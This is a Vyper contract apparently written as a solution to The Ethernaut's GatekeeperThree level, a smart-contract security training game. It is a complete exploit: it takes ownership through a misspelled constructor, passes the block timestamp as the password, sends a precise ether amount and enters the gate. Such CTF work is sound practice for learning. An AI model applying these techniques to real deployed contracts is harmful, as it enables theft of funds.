# pragma version 0.4.0
"""
@title A hack for level 28 (GatekeeperThree) of The Ethernaut
@license MIT
@author unluckyduke7
"""

interface GatekeeperThree:
    def construct0r(): nonpayable
    def createTrick(): nonpayable
    def getAllowance(password: uint256): nonpayable
    def enter(): nonpayable


@payable
@external
def hack(instance: GatekeeperThree):
    assert as_wei_value(0.001, "ether") + 1 == msg.value

    extcall instance.construct0r()
    extcall instance.createTrick()
    extcall instance.getAllowance(block.timestamp)
    raw_call(instance.address, b"", value=as_wei_value(0.001, "ether") + 1)
    extcall instance.enter()
